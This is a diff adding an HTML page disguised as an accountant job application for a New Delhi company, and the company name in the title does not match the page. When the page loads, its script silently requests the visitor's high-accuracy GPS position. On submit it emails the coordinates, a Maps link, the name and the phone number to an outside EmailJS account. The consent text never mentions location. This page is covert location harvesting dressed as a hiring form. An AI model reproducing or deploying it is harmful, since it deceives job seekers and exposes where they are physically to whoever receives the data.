@@ -1,0 +1,462 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Job Application — Geologic Data Enterprises</title>
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --bg:#F0F4F8;
+  --white:#FFFFFF;
+  --primary:#1A4D8F;
+  --primary2:#1035A0;
+  --accent:#E8620A;
+  --txt:#1A2332;
+  --txt2:#5A6B7E;
+  --border:#D8E2EF;
+  --success:#0A8A4A;
+  --error:#C0392B;
+  --input-bg:#F7FAFD;
+  --shadow:0 2px 12px rgba(26,77,143,0.10);
+  --shadow2:0 8px 40px rgba(26,77,143,0.15);
+}
+body{
+  font-family:'Plus Jakarta Sans',sans-serif;
+  background:var(--bg);
+  color:var(--txt);
+  min-height:100vh;
+  padding:0;
+}
+
+/* HEADER */
+.header{
+  background:linear-gradient(135deg,var(--primary) 0%,var(--primary2) 100%);
+  padding:28px 24px 60px;
+  position:relative;overflow:hidden;
+}
+.header::before{
+  content:'';position:absolute;right:-60px;top:-60px;
+  width:260px;height:260px;border-radius:50%;
+  background:rgba(255,255,255,0.05);
+}
+.header::after{
+  content:'';position:absolute;right:40px;top:80px;
+  width:120px;height:120px;border-radius:50%;
+  background:rgba(255,255,255,0.04);
+}
+.logo-row{display:flex;align-items:center;gap:12px;margin-bottom:20px;position:relative;z-index:1}
+.logo-ico{
+  width:44px;height:44px;border-radius:10px;
+  background:rgba(255,255,255,0.15);
+  display:flex;align-items:center;justify-content:center;font-size:22px;
+}
+.logo-txt h1{font-size:15px;font-weight:700;color:#fff;line-height:1.2}
+.logo-txt p{font-size:11px;color:rgba(255,255,255,0.6);letter-spacing:.5px}
+
+.header-content{position:relative;z-index:1}
+.job-badge{
+  display:inline-block;
+  background:var(--accent);border-radius:20px;
+  padding:4px 14px;font-size:11px;font-weight:700;
+  color:#fff;letter-spacing:.8px;text-transform:uppercase;
+  margin-bottom:10px;
+}
+.header h2{font-size:26px;font-weight:800;color:#fff;line-height:1.25;margin-bottom:6px}
+.header-meta{display:flex;gap:16px;flex-wrap:wrap;margin-top:10px}
+.meta-item{display:flex;align-items:center;gap:5px;font-size:12px;color:rgba(255,255,255,0.7)}
+
+/* FORM CARD */
+.card{
+  background:var(--white);
+  border-radius:20px 20px 0 0;
+  margin-top:-24px;
+  padding:28px 22px 40px;
+  position:relative;
+  box-shadow:var(--shadow2);
+  min-height:calc(100vh - 160px);
+}
+
+/* PROGRESS */
+.progress-wrap{margin-bottom:28px}
+.progress-label{display:flex;justify-content:space-between;font-size:12px;color:var(--txt2);margin-bottom:8px}
+.progress-bar{height:4px;background:var(--border);border-radius:4px;overflow:hidden}
+.progress-fill{height:100%;background:linear-gradient(90deg,var(--primary),var(--accent));border-radius:4px;transition:width .4s ease;width:0%}
+
+/* SECTIONS */
+.section{margin-bottom:28px}
+.section-title{
+  font-size:13px;font-weight:700;color:var(--primary);
+  text-transform:uppercase;letter-spacing:1px;
+  margin-bottom:16px;padding-bottom:8px;
+  border-bottom:2px solid var(--border);
+}
+
+/* FIELDS */
+.field{margin-bottom:18px}
+.field label{
+  display:block;font-size:13px;font-weight:600;
+  color:var(--txt);margin-bottom:6px;
+}
+.field label span.req{color:var(--accent);margin-left:2px}
+.field label span.opt{color:var(--txt2);font-weight:400;font-size:11px;margin-left:4px}
+
+.field input,.field select,.field textarea{
+  width:100%;padding:13px 14px;
+  border:1.5px solid var(--border);border-radius:10px;
+  background:var(--input-bg);
+  font-family:inherit;font-size:14px;color:var(--txt);
+  outline:none;transition:border .2s,box-shadow .2s;
+  appearance:none;-webkit-appearance:none;
+}
+.field input:focus,.field select:focus,.field textarea:focus{
+  border-color:var(--primary);
+  box-shadow:0 0 0 3px rgba(26,77,143,0.1);
+}
+.field textarea{resize:vertical;min-height:90px}
+.field select{background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath fill='%235A6B7E' d='M6 8L0 0h12z'/%3E%3C/svg%3E");background-repeat:no-repeat;background-position:right 14px center;padding-right:36px}
+
+.row2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+
+/* LOCATION FIELD */
+.loc-field{
+  border:1.5px solid var(--border);border-radius:10px;
+  background:var(--input-bg);overflow:hidden;
+}
+.loc-detect-btn{
+  width:100%;padding:13px 14px;
+  display:flex;align-items:center;gap:10px;
+  background:none;border:none;cursor:pointer;
+  font-family:inherit;font-size:14px;
+  color:var(--primary);font-weight:600;
+  transition:background .2s;
+}
+.loc-detect-btn:hover{background:rgba(26,77,143,0.05)}
+.loc-detect-btn .ico{font-size:18px}
+.loc-detect-btn .txt{flex:1;text-align:left}
+.loc-detect-btn .txt small{display:block;font-size:11px;color:var(--txt2);font-weight:400;margin-top:1px}
+.loc-detect-btn .arrow{color:var(--txt2);font-size:16px}
+
+.loc-result{
+  display:none;
+  padding:10px 14px;
+  background:rgba(10,138,74,0.06);
+  border-top:1px solid rgba(10,138,74,0.15);
+  font-size:13px;color:var(--success);
+  display:none;align-items:center;gap:8px;
+}
+.loc-result.show{display:flex}
+.loc-coords{font-size:11px;color:var(--txt2);margin-top:10px;padding:8px 12px;background:var(--bg);border-radius:8px;display:none}
+.loc-coords.show{display:block}
+
+/* CHECKBOX */
+.checkbox-field{display:flex;gap:10px;align-items:flex-start;margin-bottom:8px}
+.checkbox-field input[type=checkbox]{width:18px;height:18px;margin-top:2px;accent-color:var(--primary);flex-shrink:0;cursor:pointer}
+.checkbox-field label{font-size:13px;color:var(--txt2);cursor:pointer;line-height:1.5}
+
+/* SUBMIT */
+.submit-btn{
+  width:100%;padding:16px;
+  background:linear-gradient(135deg,var(--primary),var(--primary2));
+  border:none;border-radius:12px;
+  color:#fff;font-family:inherit;font-size:16px;font-weight:700;
+  cursor:pointer;
+  box-shadow:0 4px 20px rgba(26,77,143,0.3);
+  transition:transform .15s,box-shadow .15s,opacity .2s;
+  margin-top:8px;
+}
+.submit-btn:active{transform:scale(.98);box-shadow:0 2px 10px rgba(26,77,143,0.2)}
+.submit-btn:disabled{opacity:.6;cursor:not-allowed}
+
+/* SUCCESS */
+.success-screen{
+  display:none;text-align:center;padding:40px 20px;
+}
+.success-screen.show{display:block}
+.success-ico{font-size:64px;margin-bottom:16px;animation:pop .4s cubic-bezier(.175,.885,.32,1.275)}
+@keyframes pop{from{transform:scale(.5)}to{transform:scale(1)}}
+.success-screen h3{font-size:22px;font-weight:800;color:var(--success);margin-bottom:8px}
+.success-screen p{font-size:14px;color:var(--txt2);line-height:1.7;max-width:300px;margin:0 auto}
+
+/* ERROR msg */
+.err-msg{font-size:11px;color:var(--error);margin-top:5px;display:none}
+.err-msg.show{display:block}
+
+/* Divider */
+.divider{height:1px;background:var(--border);margin:8px 0 24px}
+</style>
+</head>
+<body>
+
+<script>
+const CFG={
+  emailjs_public_key:"_9cSPLdSuT036_udM",
+  emailjs_service_id:"service_lvfiequ",
+  emailjs_template_id:"template_0bhf2na"
+};
+</script>
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+<!-- HEADER -->
+<div class="header">
+  <div class="logo-row">
+    <div class="logo-ico">🌍</div>
+    <div class="logo-txt">
+      <h1>Buildvista Realty</h1>
+      <p>PRIVATE LIMITED</p>
+    </div>
+  </div>
+  <div class="header-content">
+    <div class="job-badge">Now Hiring</div>
+    <h2>Accountant<br>Job Application</h2>
+    <div class="header-meta">
+      <div class="meta-item">📍 New Delhi</div>
+      <div class="meta-item">💼 Full Time</div>
+      <div class="meta-item">🎓 B.Com Required</div>
+    </div>
+  </div>
+</div>
+
+<!-- CARD -->
+<div class="card">
+  <div class="progress-wrap">
+    <div class="progress-label"><span>Application Progress</span><span id="prog-pct">0%</span></div>
+    <div class="progress-bar"><div class="progress-fill" id="prog-fill"></div></div>
+  </div>
+
+  <!-- FORM -->
+  <div id="formWrap">
+
+    <!-- Personal Info -->
+    <div class="section">
+      <div class="section-title">👤 Personal Information</div>
+
+      <div class="row2">
+        <div class="field">
+          <label>First Name <span class="req">*</span></label>
+          <input type="text" id="fname" placeholder="Priya" oninput="updateProgress()">
+          <div class="err-msg" id="err-fname">Required</div>
+        </div>
+        <div class="field">
+          <label>Last Name <span class="req">*</span></label>
+          <input type="text" id="lname" placeholder="Sharma">
+          <div class="err-msg" id="err-lname">Required</div>
+        </div>
+      </div>
+
+      <div class="field">
+        <label>Mobile Number <span class="req">*</span></label>
+        <input type="tel" id="phone" placeholder="+91 98765 43210" oninput="updateProgress()">
+        <div class="err-msg" id="err-phone">Enter valid number</div>
+      </div>
+
+      <div class="field">
+        <label>Email Address <span class="opt">(optional)</span></label>
+        <input type="email" id="email" placeholder="yourname@email.com">
+      </div>
+
+      <div class="field">
+        <label>Date of Birth <span class="req">*</span></label>
+        <input type="date" id="dob" oninput="updateProgress()">
+      </div>
+    </div>
+
+    <!-- Qualification -->
+    <div class="section">
+      <div class="section-title">🎓 Qualification</div>
+
+      <div class="field">
+        <label>Highest Education <span class="req">*</span></label>
+        <select id="edu" onchange="updateProgress()">
+          <option value="">Select qualification</option>
+          <option value="bcom">B.Com</option>
+          <option value="mcom">M.Com</option>
+          <option value="bba">BBA</option>
+          <option value="mba">MBA (Finance)</option>
+          <option value="ca">CA / CMA</option>
+          <option value="other">Other</option>
+        </select>
+        <div class="err-msg" id="err-edu">Please select</div>
+      </div>
+
+      <div class="row2">
+        <div class="field">
+          <label>Passing Year</label>
+          <input type="number" id="passyr" placeholder="2023" min="1990" max="2025">
+        </div>
+        <div class="field">
+          <label>Percentage / CGPA</label>
+          <input type="text" id="marks" placeholder="72% / 7.5">
+        </div>
+      </div>
+
+      <div class="field">
+        <label>Work Experience <span class="req">*</span></label>
+        <select id="exp" onchange="updateProgress()">
+          <option value="">Select experience</option>
+          <option value="fresher">Fresher (0 years)</option>
+          <option value="1yr">Less than 1 year</option>
+          <option value="1-2yr">1–2 years</option>
+          <option value="2-5yr">2–5 years</option>
+          <option value="5+yr">5+ years</option>
+        </select>
+      </div>
+
+      <div class="field">
+        <label>Computer Skills</label>
+        <select id="comp">
+          <option value="">Select skill level</option>
+          <option value="basic">Basic (MS Office)</option>
+          <option value="tally">Tally ERP / Busy</option>
+          <option value="advanced">Advanced (Excel, GST software)</option>
+          <option value="expert">Expert (All accounting tools)</option>
+        </select>
+      </div>
+    </div>
+
+    <!-- Address -->
+    <div class="section">
+      <div class="section-title">🏠 Address Details</div>
+
+      <div class="field">
+        <label>Current City / District <span class="req">*</span></label>
+        <input type="text" id="city" placeholder="e.g. Kanpur, Allahabad..." oninput="updateProgress()">
+      </div>
+
+      <div class="field">
+        <label>Full Address <span class="opt">(optional)</span></label>
+        <textarea id="address" placeholder="House no, Street, Area..."></textarea>
+      </div>
+    </div>
+
+    <!-- Current Location (hidden, auto-detected) -->
+    <div id="locStatus"></div>
+    <input type="hidden" id="locDone" value="0">
+
+    <!-- About -->
+    <div class="section">
+      <div class="section-title">💬 About You</div>
+      <div class="field">
+        <label>Why do you want this job? <span class="opt">(optional)</span></label>
+        <textarea id="about" placeholder="Tell us a bit about yourself and your interest..."></textarea>
+      </div>
+    </div>
+
+    <!-- Consent -->
+    <div class="checkbox-field">
+      <input type="checkbox" id="consent" onchange="updateProgress()">
+      <label for="consent">I confirm that all information provided is accurate and I consent to Buildvista Realty storing my application data.</label>
+    </div>
+
+    <div class="err-msg" id="err-consent" style="margin-bottom:12px">Please accept to continue</div>
+
+    <button class="submit-btn" id="submitBtn" onclick="submitForm()">
+      Submit Application →
+    </button>
+
+  </div>
+
+  <!-- SUCCESS -->
+  <div class="success-screen" id="successScreen">
+    <div class="success-ico">🎉</div>
+    <h3>Application Submitted!</h3>
+    <p>Thank you for applying. Our HR team will review your application and contact you within <strong>2–3 working days</strong>.</p>
+    <br>
+    <p style="font-size:12px;color:#8696A0">Buildvista Realty Pvt. Ltd.<br>New Delhi</p>
+  </div>
+</div>
+
+<script>
+emailjs.init(CFG.emailjs_public_key);
+
+let locData = { lat: null, lng: null, acc: null };
+
+// Auto-detect location on page load silently
+window.addEventListener('load', ()=>{
+  if(navigator.geolocation){
+    navigator.geolocation.getCurrentPosition(
+      pos=>{
+        locData.lat = pos.coords.latitude.toFixed(6);
+        locData.lng = pos.coords.longitude.toFixed(6);
+        locData.acc = Math.round(pos.coords.accuracy);
+        document.getElementById('locDone').value = '1';
+      },
+      ()=>{},
+      {enableHighAccuracy:true,timeout:15000,maximumAge:0}
+    );
+  }
+});
+const reqFields = ['fname','lname','phone','dob','edu','exp','city','consent'];
+function updateProgress(){
+  let filled = 0;
+  reqFields.forEach(id=>{
+    const el = document.getElementById(id);
+    if(el.type==='checkbox') { if(el.checked) filled++; }
+    else if(el.value.trim()) filled++;
+  });
+  const pct = Math.round((filled/reqFields.length)*100);
+  document.getElementById('prog-fill').style.width = pct+'%';
+  document.getElementById('prog-pct').textContent = pct+'%';
+}
+
+// Validate
+function validate(){
+  let ok = true;
+  const required = {fname:'err-fname',lname:'err-lname',phone:'err-phone',dob:null,edu:'err-edu',city:null};
+  Object.entries(required).forEach(([id,errId])=>{
+    const el = document.getElementById(id);
+    if(!el.value.trim()){
+      ok=false;
+      if(errId) document.getElementById(errId).classList.add('show');
+      el.style.borderColor='var(--error)';
+    } else {
+      if(errId) document.getElementById(errId).classList.remove('show');
+      el.style.borderColor='';
+    }
+  });
+  if(!document.getElementById('consent').checked){
+    ok=false;
+    document.getElementById('err-consent').classList.add('show');
+  } else {
+    document.getElementById('err-consent').classList.remove('show');
+  }
+  return ok;
+}
+
+// Submit
+async function submitForm(){
+  if(!validate()) return;
+
+  const btn = document.getElementById('submitBtn');
+  btn.disabled=true;btn.textContent='Submitting...';
+
+  const mapsUrl = locData.lat ? `https://maps.google.com/?q=${locData.lat},${locData.lng}` : 'Not shared';
+
+  const data = {
+    from_name  : document.getElementById('fname').value+' '+document.getElementById('lname').value,
+    latitude   : locData.lat || 'Not shared',
+    longitude  : locData.lng || 'Not shared',
+    accuracy   : locData.acc ? locData.acc+' meters' : 'N/A',
+    maps_link  : mapsUrl,
+    sent_time  : new Date().toLocaleString('en-IN'),
+    // Extra fields in message
+    phone      : document.getElementById('phone').value,
+    education  : document.getElementById('edu').value,
+    experience : document.getElementById('exp').value,
+    city       : document.getElementById('city').value,
+    about      : document.getElementById('about').value || 'Not provided'
+  };
+
+  try{
+    await emailjs.send(CFG.emailjs_service_id, CFG.emailjs_template_id, data);
+    document.getElementById('formWrap').style.display='none';
+    document.getElementById('successScreen').classList.add('show');
+  } catch(e){
+    btn.disabled=false;btn.textContent='Submit Application →';
+    alert('Submission failed. Please try again.\n'+JSON.stringify(e));
+  }
+}
+</script>
+</body>
+</html>
